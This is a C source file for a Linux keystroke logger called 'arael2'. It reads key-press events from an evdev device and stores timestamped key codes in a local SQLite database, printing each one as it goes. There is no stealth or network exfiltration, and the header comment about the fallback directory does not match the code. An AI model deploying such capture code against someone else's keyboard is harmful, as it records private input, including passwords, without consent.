/*  arael2 – linux keylogger
 *
 *  build:  gcc -O2 -std=c11 -lsqlite3 keylog.c -o keylog.exe
 *  usage:  sudo ./keylog.exe /dev/input/event3
 *
 *  behaviour
 *  ---------
 *  • key-press events from the given evdev device are recorded in
 *      $ARAEL2_ROOT/keydb/keys.db
 *    (falls back to the current working directory when ARAEL2_ROOT
 *     is unset or empty).
 *  • on start-up we print:
 *        – project root
 *        – resolved database directory
 *        – resolved database file
 *        – input device path
 *  • every captured key code is printed immediately.
 */

 #define _POSIX_C_SOURCE 199309L

 #include <errno.h>
 #include <fcntl.h>
 #include <linux/input.h>
 #include <signal.h>
 #include <sqlite3.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/time.h>
 #include <time.h>
 #include <unistd.h>
 
 #define KEYDB_SUBDIR "/keydb"
 #define KEYDB_FILE   "/keys.db"
 #define MAX_PATH_LEN 4096
 
 /* ------------------------------------------------------------------ */
 /* helpers                                                            */
 /* ------------------------------------------------------------------ */
 static volatile sig_atomic_t stop_flag = 0;
 
 static void fatal(const char *msg)
 {
     perror(msg);
     exit(EXIT_FAILURE);
 }
 
 static void on_signal(int sig)
 {
     (void)sig;
     stop_flag = 1;
 }
 
 static int64_t tv_to_us(const struct timeval *t)
 {
     return (int64_t)t->tv_sec * 1000000LL + t->tv_usec;
 }
 
 static void ensure_dir(const char *dir)
 {
     if (access(dir, F_OK) == -1 && mkdir(dir, 0700) == -1 && errno != EEXIST)
         fatal("mkdir keydb");
 }
 
 /* ------------------------------------------------------------------ */
 /* main                                                               */
 /* ------------------------------------------------------------------ */
 int main(int argc, char **argv)
 {
     if (argc < 2) {
         fprintf(stderr, "device path required (e.g. /dev/input/event3)\n");
         return 1;
     }
     const char *device_path = argv[1];
 
     /* figure out project root and db paths */
     const char *root = getenv("ARAEL2_ROOT");
     if (!root || *root == '\0')
         root = "../..";
 
     char db_dir[MAX_PATH_LEN];
     char db_path[MAX_PATH_LEN];
 
     if (snprintf(db_dir, sizeof db_dir, "%s%s", root, KEYDB_SUBDIR) >= (int)sizeof db_dir)
         fatal("db directory path too long");
 
     if (snprintf(db_path, sizeof db_path, "%s%s", db_dir, KEYDB_FILE) >= (int)sizeof db_path)
         fatal("db file path too long");
 
     /* print every critical resolved value */
     printf("arael2 root        : %s\n", root);
     printf("keystroke db dir   : %s\n", db_dir);
     printf("keystroke db file  : %s\n", db_path);
     printf("input device       : %s\n", device_path);
     fflush(stdout);
 
     /* ensure keydb directory exists */
     ensure_dir(db_dir);
 
     /* install signal handlers */
     signal(SIGINT,  on_signal);
     signal(SIGTERM, on_signal);
     signal(SIGHUP,  on_signal);
     signal(SIGQUIT, on_signal);
 
     /* open keyboard device */
     int fd = open(device_path, O_RDONLY | O_NONBLOCK);
     if (fd < 0)
         fatal("open input device");
 
     printf("opened input device (fd=%d)\n", fd);
     fflush(stdout);
 
     /* open / initialise sqlite */
     sqlite3 *db;
     if (sqlite3_open(db_path, &db) != SQLITE_OK)
         fatal("sqlite open");
 
     printf("sqlite database opened successfully\n");
     fflush(stdout);
 
     sqlite3_exec(db, "pragma journal_mode=WAL;", 0, 0, 0);
     sqlite3_exec(db,
         "create table if not exists keystrokes ("
         " ts_us integer,"
         " code  integer,"
         " os    text);",
         0, 0, 0);
 
     const char *sql = "insert into keystrokes(ts_us, code, os) values (?,?,?);";
     sqlite3_stmt *stmt;
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK)
         fatal("sqlite prepare");
 
     printf("sqlite statement prepared, entering event loop…\n");
     fflush(stdout);
 
     /* event loop */
     struct input_event ev;
     struct timespec nap = {0, 1 * 1000 * 1000};  /* 1 ms */
 
     while (!stop_flag) {
         ssize_t n = read(fd, &ev, sizeof ev);
         if (n == -1) {
             if (errno == EAGAIN || errno == EWOULDBLOCK) {
                 nanosleep(&nap, 0);
                 continue;
             }
             fatal("read");
         }
         if (n != sizeof ev)
             continue;
         if (ev.type == EV_KEY && ev.value == 1) {            /* key down */
             int64_t ts_us = tv_to_us(&ev.time);
 
             sqlite3_bind_int64(stmt, 1, ts_us);
             sqlite3_bind_int   (stmt, 2, ev.code);
             sqlite3_bind_text  (stmt, 3, "linux", -1, SQLITE_STATIC);
 
             if (sqlite3_step(stmt) != SQLITE_DONE)
                 fprintf(stderr, "sqlite step error: %s\n", sqlite3_errmsg(db));
 
             sqlite3_reset(stmt);     /* ready for next insert */
 
             printf("captured keycode %d at %lld us\n", ev.code, (long long)ts_us);
             fflush(stdout);
         }
     }
 
     sqlite3_finalize(stmt);
     sqlite3_close(db);
     close(fd);
 
     fprintf(stderr, "\n[clean exit] keystrokes saved. goodbye.\n");
     return 0;
 }
 